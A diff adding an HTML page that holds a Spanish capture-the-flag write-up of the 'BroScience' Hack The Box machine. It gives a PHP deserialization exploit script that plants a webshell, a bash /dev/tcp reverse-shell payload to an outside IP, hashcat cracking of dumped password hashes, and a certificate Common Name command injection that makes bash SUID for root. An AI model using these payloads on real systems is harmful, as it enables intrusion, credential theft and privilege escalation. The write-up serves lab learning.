+                <p>Creo un script PHP que genera la cookie serializada maliciosa:</p>
+                
+                <pre><code class="language-php"><?php
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath;
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+
+$avatar_interface = new AvatarInterface();
+$avatar_interface->tmp = "/var/lib/php/sessions/sess_jpo8v40orkkava8bb8h9em11a9";
+$avatar_interface->imgPath = "./shell.php";
+
+$cookie = base64_encode(serialize($avatar_interface));
+echo $cookie;
+?></code></pre>
+                
+                <p>Este script crea un objeto <code>AvatarInterface</code> que leerá mi archivo de sesión envenenado y lo escribirá en <code>shell.php</code> en la raíz web.</p>
+                
+                <h3>Paso 3: Desencadenando el Exploit</h3>
+                <p>Reemplazo mi cookie <code>user-prefs</code> con el objeto serializado malicioso y recargo la página. La aplicación deserializa mi objeto, desencadenando el método <code>__wakeup()</code>, que crea exitosamente la webshell:</p>
+                <p><img src="./media/image4.png" alt="Webshell creada exitosamente visible en el código fuente de la página mostrando contenido de sesión PHP" /></p>
+                
+                <h3>Paso 4: Obteniendo una Reverse Shell</h3>
+                <p>Ahora puedo ejecutar comandos a través de la webshell. Me envío una reverse shell usando este payload:</p>
+                
+                <pre><code class="language-bash">https://broscience.htb/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26/dev/tcp/10.10.16.2/443%200%3E%261%22</code></pre>
+                
+                <p>En mi listener de netcat:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.233] 56104
+bash: cannot set terminal process group (879): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@broscience:/var/www/html$</code></pre>
+                
+                <p>Ahora tengo acceso shell como <code>www-data</code>.</p>
+                
+                <h2>Movimiento Lateral al Usuario Bill</h2>
+                <p>Explorando el sistema, encuentro un usuario llamado <code>bill</code> en <code>/home</code>. También noto un script en <code>/opt</code> llamado <code>renew_cert.sh</code> propiedad de root, que sospecho será útil para la escalada de privilegios más adelante.</p>
+                
+                <p>Recordando las credenciales de PostgreSQL que encontré antes, me conecto a la base de datos y extraigo hashes de contraseñas:</p>
+                
+                <pre><code class="language-sql">SELECT username, password FROM users;</code></pre>
+                
+                <p>Recupero varios hashes MD5:</p>
+                <pre><code class="language-plaintext">15657792073e8a843d4f91fc403454e1  (admin)
+13edad4932da9dbb57d9cd15b66ed104  (bill)
+bd3dad50e2d578ecba87d5fa15ca5f85  (michael)
+a7eed23a7be6fe0d765197b1027453fe  (john)
+5d15340bded5b9395d5d14b9c21bc82b  (dmytro)</code></pre>
+                
+                <p>Del archivo de configuración de la base de datos, sé que estos hashes están salteados con <code>NaCl</code> usando el formato <code>md5($salt . $password)</code>. Esto corresponde al modo 20 de hashcat:</p>
+                
+                <pre><code class="language-plaintext">20 | md5($salt.$pass) | Raw Hash, Salted and/or Iterated</code></pre>
+                
+                <p>Creo un archivo con los hashes en el formato adecuado (<code>hash:salt</code>) y ejecuto hashcat:</p>
+                
+                <pre><code class="language-bash">hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+                
+                <p>Tres hashes se crackean exitosamente:</p>
+                <pre><code class="language-plaintext">bill    => 13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+dmytro  => 5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
+michael => bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples</code></pre>
+                
+                <p>Las credenciales de bill funcionan para SSH, permitiéndome iniciar sesión como <code>bill</code> y recuperar la flag de usuario.</p>
+                
+                <h2>Escalada de Privilegios - Análisis del Script de Renovación de Certificados</h2>
+                <p>Tras obtener acceso como bill, investigo vectores potenciales de escalada de privilegios. No tengo privilegios sudo para ejecutar el script de renovación de certificados directamente, y tampoco es SUID. Mi hipótesis es que el script se ejecuta periódicamente como root.</p>
+                
+                <p>Para confirmarlo, transfiero <code>pspy64</code> a la máquina objetivo y lo ejecuto para monitorizar los procesos en ejecución. Tras una breve espera, observo:</p>
+                
+                <pre><code class="language-plaintext">2025/12/26 10:52:01 CMD: UID=0 PID=5632 | /bin/bash /root/cron.sh
+2025/12/26 10:52:01 CMD: UID=0 PID=5633 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+2025/12/26 10:52:01 CMD: UID=0 PID=5634 | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt</code></pre>
+                
+                <p>¡Perfecto! Root está ejecutando el script periódicamente mediante cron, buscando un certificado en <code>/home/bill/Certs/broscience.crt</code> y pasándolo como argumento.</p>
+                
+                <h3>Analizando el Script Vulnerable</h3>
+                <p>Examinando el script <code>renew_cert.sh</code>, encuentro esta línea vulnerable:</p>
+                
+                <pre><code class="language-bash">/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"</code></pre>
+                
+                <p>La variable <code>$commonName</code> se extrae del campo Common Name del certificado. La vulnerabilidad crítica aquí es que bash realizará <strong>sustitución de comandos</strong> sobre esta variable antes de ejecutar el comando. Si puedo inyectar un comando usando la sintaxis <code>$(comando)</code> en el campo Common Name, se ejecutará como root.</p>
+                
+                <h3>Testeando la Inyección de Comandos</h3>
+                <p>Creo un certificado de prueba con un Common Name malicioso para verificar la vulnerabilidad:</p>
+                
+                <pre><code class="language-bash">openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null -out /tmp/xd.crt -days 1</code></pre>
+                
+                <p>Cuando se me solicita el Common Name, introduzco: <code>$(id)</code></p>
+                
+                <p>Ejecutando manualmente el script sobre este certificado muestra:</p>
+                
+                <pre><code class="language-bash">/opt/renew_cert.sh /tmp/xd.crt</code></pre>
+                
+                <pre><code class="language-plaintext">C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, OU = section, CN = $(id)
+Country => AU
+State => Some-State
+Locality =>
+Org Name => Internet Widgits Pty Ltd
+Org Unit => section
+Common Name => $(id)
+Email =>
+Generating certificate...
+mv: target 'groups=1000(bill).crt' is not a directory</code></pre>
+                
+                <p>¡El mensaje de error revela que el comando <code>id</code> fue ejecutado! La salida muestra <code>groups=1000(bill)</code>, probando que la inyección de comandos funciona.</p>
+                
+                <h2>Explotando la Inyección de Comandos para Root</h2>
+                <p>Ahora crearé un certificado malicioso que será recogido por el trabajo cron. Mi payload hará a <code>/bin/bash</code> SUID, permitiéndome generar una shell root:</p>
+                
+                <pre><code class="language-bash">openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null -out /home/bill/Certs/broscience.crt -days 1</code></pre>
+                
+                <p>Para el Common Name, uso: <code>$(chmod u+s /bin/bash)</code></p>
+                
+                <p>Esto genera un certificado en la ubicación exacta donde el trabajo cron espera encontrarlo. Cuando root ejecute el script sobre este certificado, la sustitución de comandos se desencadenará, haciendo bash SUID.</p>
+                
+                <p>Tras esperar a que el trabajo cron se ejecute, verifico que bash es ahora SUID:</p>
+                
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash</code></pre>
+                
+                <p>¡Perfecto! Ahora puedo generar una shell root usando la flag <code>-p</code> de bash (que preserva los privilegios SUID):</p>
+                
+                <pre><code class="language-bash">bash -p</code></pre>
+                
+                <pre><code class="language-bash">bash-5.1# id
+uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
+bash-5.1# cat /root/root.txt</code></pre>
+                
+                <p>Recupero exitosamente la flag de root y completo la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
